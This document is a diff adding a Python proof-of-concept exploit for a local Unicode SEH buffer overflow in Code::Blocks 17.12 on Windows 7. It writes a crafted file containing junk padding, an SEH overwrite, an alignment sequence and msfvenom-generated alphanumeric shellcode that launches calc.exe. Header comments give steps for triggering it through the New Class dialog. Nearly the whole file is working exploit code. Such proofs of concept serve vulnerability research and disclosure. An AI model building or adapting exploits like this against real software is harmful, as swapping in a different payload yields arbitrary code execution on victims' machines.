@@ -1,0 +1,71 @@
+#!/usr/bin/python
+
+#
+# Exploit Author: bzyo
+# Twitter: @bzyo_
+# Exploit Title:  Code Blocks 17.12 - Local Buffer Overflow (SEH)(Unicode)
+# Date: 01-10-2019
+# Vulnerable Software: Code Blocks 17.12
+# Vendor Homepage: http://www.codeblocks.org/
+# Version: 17.12
+# Software Link:
+# http://sourceforge.net/projects/codeblocks/files/Binaries/17.12/Windows/codeblocks-17.12-setup.exe
+# Tested Windows 7 SP1 x86
+#
+#
+# PoC
+# 1. generate codeblocks.txt, copy contents to clipboard
+# 2. open cold blocks app
+# 3. select File, New, Class
+# 4. paste contents from clipboard into Class name
+# 5. select Create
+# 6. pop calc
+#
+
+filename = "codeblocks.txt"
+
+
+junk = "A"*1982
+
+
+nseh = "\x61\x62"
+
+#0x005000e0 pop edi # pop ebp # ret  | startnull,unicode {PAGE_EXECUTE_READ} [codeblocks.exe]
+seh = "\xe0\x50"
+
+nops = "\x47"*10
+
+valign = (
+"\x53" 				#push ebx
+"\x47" 				#align
+"\x58" 				#pop eax
+"\x47"                          #align
+"\x47"                          #align
+"\x05\x28\x11" 	                #add eax  
+"\x47"                          #align
+"\x2d\x13\x11"                  #sub eax
+"\x47"				#align
+"\x50"				#push eax
+"\x47"				#align
+"\xc3"				#retn
+)
+
+nops_sled = "\x47"*28
+
+#msfvenom -p windows/exec CMD=calc.exe -e x86/unicode_upper BufferRegister=EAX
+#Payload size: 517 bytes
+calc = (
+"PPYAIAIAIAIAQATAXAZAPU3QADAZABARALAYAIAQAIAQAPA5AAAPAZ1AI1AIAIAJ11AIAIAXA58AAPAZABABQI1A"
+"IQIAIQI1111AIAJQI1AYAZBABABABAB30APB944JBKLIXDBM0KPKP1PU9ZE01I0RD4KPPP0DK0RLL4KB2MD4KRRN"
+"HLO6WOZNFP1KOFLOLC13LKRNLMPI18OLMM17W9RKBB21GTKPRLPDKPJOL4K0LN1RXZCPHKQZ1PQ4K29O0KQXS4KOY"
+"N8YSOJOYDKNT4KKQXV01KOFLY18OLMM1GWOH9PSEKFM3SMZXOKSMNDT5ITPXDKPXMTKQ8SC6TKLL0KTKPXMLM1YCD"
+"KLDTKM1J0SYOTMTMTQKQKS10YQJB1KOIPQO1OQJ4KMBZK4MQM2JKQ4MTEX2KPKPKPPP2HP1TKBOTGKOZ5GKJP6UVB"
+"0V2HW65EGM5MKO8UOLLFSLLJU0KKIPRUKUWK0GMCCBRORJKPB3KOIE2CC1RLQSNNQU2X35M0AA")
+
+fill = "D"*10000
+
+buffer = junk + nseh + seh + nops + valign + nops_sled + calc + fill
+
+textfile = open(filename , 'w')
+textfile.write(buffer)
+textfile.close()
